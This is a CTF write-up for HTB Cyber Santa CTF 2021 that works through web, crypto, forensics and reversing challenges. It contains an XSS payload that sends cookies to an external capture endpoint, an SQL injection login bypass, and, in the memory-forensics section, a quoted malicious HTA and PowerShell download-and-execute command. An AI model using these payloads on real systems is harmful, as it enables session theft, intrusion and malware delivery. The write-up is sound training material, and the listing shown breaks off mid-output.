---
layout: post
title: "HTB Cyber Santa CTF 2021 - Write-up"
lang: en
categories:
  - writeups
tags:
  - security
  - writeups
  - ctf
  - web
date: 2021/12/05
thumbnail: /images/ctf.png

---
## 💢 Info 

### Version

| By    | Version | Comment
| ---   | ---     | ---
| noraj | 1.0     | Creation

### CTF

- **Name** : HTB Cyber Santa CTF 2021
- **Website** : [hackthebox.com](https://www.hackthebox.com/events/santa-needs-your-help)
- **Type** : Online
- **Format** : Jeopardy
- **CTF Time** : [link](https://ctftime.org/event/1523/)

## Day 1 - 01/12/2021

### Toy Workshop - Web

#### Source code analysis

We can download and review the source code of the app.

```
$ tree web_toy_workshop
├── build-docker.sh
├── challenge
│   ├── bot.js
│   ├── database.js
│   ├── index.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── audio
│   │   │   └── audio.mp3
│   │   ├── css
│   │   │   ├── bootstrap.min.css
│   │   │   ├── dashboard.css
│   │   │   ├── index.css
│   │   │   ├── remodal.css
│   │   │   └── remodal-default-theme.css
│   │   ├── images
│   │   │   ├── ballset.png
│   │   │   ├── ballset.png~
│   │   │   ├── bayblade.png~
│   │   │   ├── bearset.png
│   │   │   ├── bearset.png~
│   │   │   ├── bin2.png
│   │   │   ├── bin2.png~
│   │   │   ├── cflower.png
│   │   │   ├── elf1.png
│   │   │   ├── elf2.png
│   │   │   ├── gameset.png
│   │   │   ├── gameset.png~
│   │   │   ├── logo.png
│   │   │   ├── santa-loading.gif
│   │   │   ├── sign_post.png
│   │   │   ├── trainset.png
│   │   │   └── trainset.png~
│   │   └── js
│   │       ├── bootstrap.min.js
│   │       ├── conveyor.js
│   │       ├── index.js
│   │       ├── jquery-3.6.0.min.js
│   │       └── remodal.min.js
│   └── views
│       ├── index.hbs
│       └── queries.hbs
├── config
│   └── supervisord.conf
└── Dockerfile

9 directories, 38 files
```

By reading `/challenge/routes/index.js` we can find the routes of the app.

The two routes that are interesting are the following:

```javascript
router.post('/api/submit', async (req, res) => {

    const { query } = req.body;
    if(query){
      return db.addQuery(query)
        .then(() => {
          bot.readQueries(db);
          res.send(response('Your message is delivered successfully!'));
        });
    }
    return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) => {
  if(req.ip != '127.0.0.1') return res.redirect('/');

  return db.getQueries()
    .then(queries => {
      res.render('queries', { queries });
    })
    .catch(() => res.status(500).send(response('Something went wrong!')));
});
```

Also the following chunk of code in `/challenge/bot.js` allow us to understand
that a bot will consult the queries page.

```javascript
const readQueries = async (db) => {
    const browser = await puppeteer.launch(browser_options);
    let context = await browser.createIncognitoBrowserContext();
    let page = await context.newPage();
    await page.goto('http://127.0.0.1:1337/');
    await page.setCookie(...cookies);
    await page.goto('http://127.0.0.1:1337/queries', {
      waitUntil: 'networkidle2'
    });
    await browser.close();
    await db.migrate();
};
```

We can't browse the `/queries` endpoint directly because it can be viewed only
from localhost. So we have to submit a query to the API and wait for the bot
to browse it. We see that the bot as a cookie containing the flag so our goal
will be to steal that cookie.

#### XSS - Cookie grabbing

This JavaScript payload will retrieve unprotected cookies and make a request
to an attacker controlled endpoint to exfiltrate the cookie.

```html
<script>new Image().src="https://hookb.in/Mq2WRx6kojSDRWppRMgo/?c="+document.cookie;</script>
```

Query:

```http
POST /api/submit HTTP/1.1
Host: 178.128.35.31:30621
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.128.35.31:30621/
Content-Type: application/json
Origin: http://178.128.35.31:30621
Content-Length: 107
Connection: close

{"query":"<script>new Image().src=\"https://hookb.in/Mq2WRx6kojSDRWppRMgo/?c=\"+document.cookie;</script>"}
```

Retrieved cookie:

```
flag=HTB{3v1l_3lv3s_4r3_r1s1ng_up!}
```

### Common Mistake - Crypto

It looks like RSA parameters and cipher text encoded in hexadecimal.

```plaintext
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x10001', 'ct': '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'}
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'}
```

We can convert the hexadecimal to decimal with [ctf-party](https://noraj.github.io/ctf-party).
For example:

```ruby
irb(main):002:0> '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef'.hex2dec(prefix: '0x')
=> "21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407"
irb(main):002:0> '0x23'.hex2dec(prefix: '0x')
=> "35"
irb(main):001:0> '0x10001'.hex2dec(prefix: '0x')
=> "65537"
irb(main):001:0> '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'.hex2dec(prefix: '0x')
=> "10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428"
irb(main):002:0> '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'.hex2dec(prefix: '0x')
=> "15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856"
```

Let's conduct a Common Modulus Attack with RSHack. Here the install instruction
for BlackArch Linux.

```
$ sudo pacman -S rshack
```

Attack:

```
$ rshack


                #########################
                #      RSHack v2.1      #
                #      Zweisamkeit      #
                #      GNU GPL v3       #
                #########################



        List of the available attacks:

                1. Wiener Attack
                2. Hastad Attack
                3. Fermat Attack
                4. Bleichenbacher Attack
                5. Common Modulus Attack
                6. Chosen Plaintext Attack

        List of the available tools:

                a. RSA Public Key parameters extraction
                b. RSA Private Key parameters extraction
                c. RSA Private Key construction (PEM)
                d. RSA Public Key construction (PEM)
                e. RSA Ciphertext Decipher
                f. RSA Ciphertext Encipher

        [*] What attack or tool do you want to carry out? 5

                         ***** Common Modulus Attack *****

                [*] Arguments [-h] -n common modulus -e1 first exponent -e2 second exponent -c1 first cipher -c2 second cipher:

                        -n 21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407 -e1 65537 -e2 35 -c1 10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428 -c2 15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856


                ~~~~~~~~~~~~~~~~~~~~~~~~~
                  Common Modulus Attack
                       Zweisamkeit
                    GNU GPL v3 License
                ~~~~~~~~~~~~~~~~~~~~~~~~~


        [+] Decimal plaintext:  154494104151501230741951698942733388017524925426108770319061863579333462036794337421344018523054973

        [+] Interpreted plaintext:  HTB{c0mm0n_m0d_4774ck_15_4n07h3r_cl4ss1c}
```

### baby APT - Forensics

It's a network forensics challenge where we'll have to analyse the captured
traffic recorded in a pcap.

We can filtrer on HTTP frames or use the Export HTTP object feature.

A webshell named `bg.php` is access several times and the attacker is sending commands
to it.

One of the commands seems obfuscated, but [ctf-party](https://noraj.github.io/ctf-party)
can once again help us to decode the URL components and base64 decode it.

```
$ ctf-party 'cmd=rm++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles%2F.ht.sqlite+%26%26+echo+SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59+%3E+%2Fdev%2Fnull+2%3E%261+%26%26+ls+-al++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles' urldecode
cmd=rm  /var/www/html/sites/default/files/.ht.sqlite && echo SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 > /dev/null 2>&1 && ls -al  /var/www/html/sites/default/files
$ ctf-party 'SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59' from_b64
HTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}
```

### Mr Snowy - Pwn

I didn't do it.

### Infiltration - Reversing

Just tracing the syscall made when connecting to a remote socket we can make
the flag leak:

```
$ strace rev_infiltration/client 178.128.46.48 32124
execve("rev_infiltration/client", ["rev_infiltration/client", "178.128.46.48", "32124"], 0x7ffe28abc7d0 /* 65 vars */) = 0
brk(NULL)                               = 0x5621147dd000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffeacdfa870) = -1 EINVAL (Invalid argument)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=149796, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 149796, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f149bc68000
close(3)                                = 0
openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0`|\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\4\0\0\0@\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 80, 848) = 80
pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0K@g7\5w\10\300\344\306B4Zp<G"..., 68, 928) = 68
newfstatat(3, "", {st_mode=S_IFREG|0755, st_size=2150424, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f149bc66000
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 1880536, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f149ba9a000
mmap(0x7f149bac0000, 1355776, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f149bac0000
mmap(0x7f149bc0b000, 311296, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x171000) = 0x7f149bc0b000
mmap(0x7f149bc57000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bc000) = 0x7f149bc57000
mmap(0x7f149bc5d000, 33240, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f149bc5d000
close(3)                                = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f149ba98000
arch_prctl(ARCH_SET_FS, 0x7f149bc67580) = 0
mprotect(0x7f149bc57000, 12288, PROT_READ) = 0
mprotect(0x562114482000, 4096, PROT_READ) = 0
mprotect(0x7f149bcbb000, 8192, PROT_READ) = 0
munmap(0x7f149bc68000, 149796)          = 0
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(32124), sin_addr=inet_addr("178.128.46.48")}, 16) = 0
recvfrom(3, "X\16\201\226vg\33\374\304\0\212\2,\36\371\344\341{i\236\t\247B\324\30\20a\37I\301\332\34", 32, 0, NULL, NULL) = 32
sendto(3, "\34\332\301I\37a\20\30\324B\247\t\236i{\341\344\371\36,\2\212\0\304\374\33gv\226\201\16X", 32, 0, NULL, 0) = 32
recvfrom(3, "`:\326\364\0\261+C\252O\310\315y\270;\221\274!\r\344\200h\361\334L\20(\10\271\336Q\305", 32, 0, NULL, NULL) = 32
sendto(3, "|\340\27\275\37\320;[~\ro\304\347\321@pX\330\23\310\202\342\361\30\260\vO~/__\235", 32, 0, NULL, 0) = 32
recvfrom(3, "\0", 1, 0, NULL, NULL)     = 1
recvfrom(3, "HTB{n0t_qu1t3_s0_0p4qu3}", 1024, 0, NULL, NULL) = 24
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x5), ...}, AT_EMPTY_PATH) = 0
brk(NULL)                               = 0x5621147dd000
brk(0x5621147fe000)                     = 0x5621147fe000
write(1, "[!] Untrusted Client Location - "..., 53[!] Untrusted Client Location - Enabling Opaque Mode
) = 53
exit_group(0)                           = ?
+++ exited with 0 +++
```

`HTB{n0t_qu1t3_s0_0p4qu3}`

## Day 2 - 02/12/2021

### Toy Management - Web

While unauthenticated we can only access a authentication form.
We'll have to analyse the source code to identify an entry point.

#### Source code analysis

In `challenge/database.sql` we can understand the database structure and where
we'll have to look to find the flag.

```sql
CREATE TABLE `toylist` (
  `id` int NOT NULL,
  `toy` varchar(256) NOT NULL,
  `receiver` varchar(256) NOT NULL,
  `location` varchar(256) NOT NULL,
  `approved` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO `toylist` (`id`, `toy`, `receiver`, `location`, `approved`) VALUES
(1,  'She-Ra, Princess of Power', 'Elaina Love', 'Houston', 1),
(2, 'Bayblade Burst Evolution', 'Jarrett Pace', 'Dallas', 1),
(3, 'Barbie Dreamhouse Playset', 'Kristin Vang', 'Austin', 1),
(4, 'StarWars Action Figures', 'Jaslyn Huerta', 'Amarillo', 1),
(5, 'Hot Wheels: Volkswagen Beach Bomb', 'Eric Cameron', 'San Antonio', 1),
(6, 'Polly Pocket dolls', 'Aracely Monroe', 'El Paso', 1),
(7, 'HTB{f4k3_fl4g_f0r_t3st1ng}', 'HTBer', 'HTBland', 0);

CREATE TABLE `users` (
  `id` int NOT NULL,
  `username` varchar(256) NOT NULL,
  `password` varchar(256) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO `users` (`id`, `username`, `password`) VALUES
(1, 'manager', '69bbdcd1f9feab7842f3a1c152062407'),
(2, 'admin', '592c094d5574fb32fe9d4cce27240588');
```

Let's look how the queries to the database are crafted in `challenge/database.js`:

```javascript
  async listToys(approved=1) {
    return new Promise(async (resolve, reject) => {
      let stmt = `SELECT * FROM toylist WHERE approved = ?`;
      this.connection.query(stmt, [approved], (err, result) => {
        if(err)
          reject(err)
        try {
          resolve(JSON.parse(JSON.stringify(result)))
        }
        catch (e) {
          reject(e)
        }
      })

    });
  }

  async loginUser(user, pass) {
    return new Promise(async (resolve, reject) => {
      let stmt = `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`;
      this.connection.query(stmt, (err, result) => {
        if(err)
          reject(err)
        try {
          resolve(JSON.parse(JSON.stringify(result)))
        }
        catch (e) {
          reject(e)
        }
      })
    });
  }

  async getUser(user) {
    return new Promise(async (resolve, reject) => {
      let stmt = `SELECT * FROM users WHERE username = '${user}'`;
      this.connection.query(stmt, (err, result) => {
        if(err)
          reject(err)
        try {
          resolve(JSON.parse(JSON.stringify(result)))
        }
        catch (e) {
          reject(e)
        }
      })
    });
  }
```

`listToys()` will list the toys but only the approved ones and the flag is the
only one that is not approved. `loginUser()` and `getUser()` are unsafe because
they are conncatenating user input directly to the query so we'll be able to
perform a SQL injection.

But by reading the routes in `challenge/routes/index.js`, we can see that if
we are connected as admin, `listToys()` argument `approved` will be overriden
with `0` value so it will list unapproved toys including the flag.

```javascript
router.get('/api/toylist', AuthMiddleware, async (req, res) => {
  return db.getUser(req.data.username)
    .then(user => {
      approved = 1;
      if (user[0].username == 'admin') approved = 0;
      return db.listToys(approved)
        .then(toyInfo => {
          return res.json(toyInfo);
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
    })
    .catch(() => res.status(500).send(response('Something went wrong!')));
});
```

#### Exploitation: SQL injection

Since the login request is vulnerable to SQLi, we are able to log in as
admin just by using the following credentials:

- `admin'-- -`
- `anything`

forming this queries:

```sql
SELECT username FROM users WHERE username = 'admin'-- -' and password = 'anything'
```

We can grab the flag from the dashboard: `HTB{1nj3cti0n_1s_in3v1t4bl3}`

### XMAS Spirit - Crypto

```python
#!/usr/bin/python3

import random
from math import gcd

def encrypt(dt):
  mod = 256
  while True:
    a = random.randint(1,mod)
    if gcd(a, mod) == 1: break
  b = random.randint(1,mod)

  res = b''
  for byte in dt:
    enc = (a*byte + b) % mod
    res += bytes([enc])
  return res

dt = open('letter.pdf', 'rb').read()

res = encrypt(dt)

f = open('encrypted.bin', 'wb')
f.write(res)
f.close()
```

We know that the source file is a PDF. There are very few combinations possible
(`255*255` maximum, or `255*128` keeping only the values when `a` is coprime with the modulus).

So what we can do is take the magic bytes (signature) of a PDF (5 bytes) and
brute-force all values of `a` and `b` until we end back on the sames bytes as
the encrypted document.

```ruby
require 'ctf_party' # https://github.com/noraj/ctf-party

encdata = File.read('letter.pdf.encrypted.bin')

encheader = encdata[0...5].to_hex.scan(/.{1,2}/)
signature = ['25','50','44','46','2D'] # '%PDF-'

(1..255).each do |i|
  (1..255).each do |j|
    res = []
    signature.each do |byte|
      clear = ((byte.hex2dec.to_i*i)+j) % 256
      res << clear.chr.to_hex if (1..255).include?(clear)
    end
    puts "a=#{i}, b=#{j}" if res == encheader
  end
end
```

Doing so I retrieved the value of a and b used to encrypt the file:

```
$ ruby bf.rb
a=169, b=160
```

But after that I was unable to decrypt the file.

### Honeypot - Forensics

Let's see with Volatility3 if there are suspicious commands.

```
$ vol -f honeypot.raw windows.cmdline
...
2700    powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==
...
```

Let's decode the base64 encoded powershell payload:

```
$ printf %s 'aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==' | base64 -d
```

```powershell
iex ((new-object net.webclient).downloadstring('https://windowsliveupdater.com/update.ps1'))
```

So here we have the full URL of the malware and the PID of the powershell (2700).

Let's list processes to see it's parents and childs.

```
$ vol -f honeypot.raw windows.pslist | grep 2700
2700    3720    powershell.exe  0x8420dd28      13      444     2       False   2021-11-25 19:13:50.000000      N/A     Disabled
4028    2700    whoami.exe      0x85d8db00      0       -       2       False   2021-11-25 19:14:01.000000      2021-11-25 19:14:01.000000      Disabled
4036    2700    HOSTNAME.EXE    0x84289030      0       -       2       False   2021-11-25 19:14:01.000000      2021-11-25 19:14:01.000000      Disabled
```

The parent 3720 doesn't not exists, so let's see the childs 4028 and 4036.

We know the downloaded powershell script is about _update_ so let's find a
file related to update.

```
$ vol -f honeypot.raw windows.filescan | grep update
0x3e7c4c50 100.0\Windows\System32\Tasks\Microsoft\Windows\Media Center\mcupdate 128
0x3ee413b0      \Windows\System32\mcupdate_AuthenticAMD.dll     128
0x3f4d4348      \Users\Santa\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\M3FMRSOD\christmas_update[1].hta      128
```

The last file looks interesting, let's download it.

```
$ vol -f honeypot.raw windows.dumpfiles --physaddr 0x3f4d4348
Volatility 3 Framework 1.0.1
Progress:  100.00               PDB scanning finished
Cache   FileObject      FileName        Result

DataSectionObject       0x3f4d4348      christmas_update[1].hta file.0x3f4d4348.0x84ac5568.DataSectionObject.christmas_update[1].hta.dat
```

```html
<html>
<head>
<HTA:APPLICATION id="Microsoft" applicationName="Christmas update"/>
<script>
var sh = new ActiveXObject("WScript.Shell");
sh.run('powershell.exe /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==');
window.close();
</script>
</html>
```

So it seems the powershell backdoor was launched by a malicious website with
ActiveX. So the parent process 3720 was likely a web browser.

If we look at network connections we can see there are no foreign addresses
associated with `powershell.exe` process or its childs.

```
$ vol -f honeypot.raw windows.netscan
Volatility 3 Framework 1.0.1
Progress:  100.00               PDB scanning finished
Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

0x23d04218      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       400     services.exe    N/A
0x23d04218      TCPv6   ::      49155   ::      0       LISTENING       400     services.exe    N/A
0x2554b460      TCPv4   10.0.2.15       49226   93.184.220.29   80      ESTABLISHED     -       -       -
0x261e9d30      TCPv4   10.0.2.15       49228   172.67.177.22   443     ESTABLISHED     -       -       -
0x3e22f008      UDPv4   0.0.0.0 0       *       0               2080    svchost.exe     2021-11-25 19:12:23.000000
0x3e22f008      UDPv6   ::      0       *       0               2080    svchost.exe     2021-11-25 19:12:23.000000
0x3e238300      TCPv4   0.0.0.0 445     0.0.0.0 0       LISTENING       4       System  N/A
0x3e238300      TCPv6   ::      445     ::      0       LISTENING       4       System  N/A
0x3e24c588      UDPv4   0.0.0.0 0       *       0               2080    svchost.exe     2021-11-25 19:12:23.000000
0x3e281368      UDPv4   10.0.2.15       138     *       0               4       System  2021-11-25 19:12:23.000000
0x3e2a29b8      UDPv4   0.0.0.0 0       *       0               1084    svchost.exe     2021-11-25 19:12:23.000000
0x3e2a29b8      UDPv6   ::      0       *       0               1084    svchost.exe     2021-11-25 19:12:23.000000
0x3e2a6448      UDPv4   0.0.0.0 5355    *       0               1084    svchost.exe     2021-11-25 19:12:26.000000
0x3e2b5b88      TCPv4   10.0.2.15       139     0.0.0.0 0       LISTENING       4       System  N/A
0x3e2e9cc0      TCPv4   10.0.2.15       49221   212.205.126.106 443     ESTABLISHED     -       -       -
0x3e354618      UDPv6   fe80::256b:4013:4140:453f       546     *       0               744     svchost.exe     2021-11-25 19:12:31.000000
0x3e3b0c70      UDPv4   0.0.0.0 0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000
0x3e5e4f50      UDPv4   0.0.0.0 5355    *       0               1084    svchost.exe     2021-11-25 19:12:26.000000
0x3e5e4f50      UDPv6   ::      5355    *       0               1084    svchost.exe     2021-11-25 19:12:26.000000
0x3e5f77a0      TCPv4   0.0.0.0 22      0.0.0.0 0       LISTENING       1676    sshd.exe        N/A
0x3e619578      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       348     wininit.exe     N/A
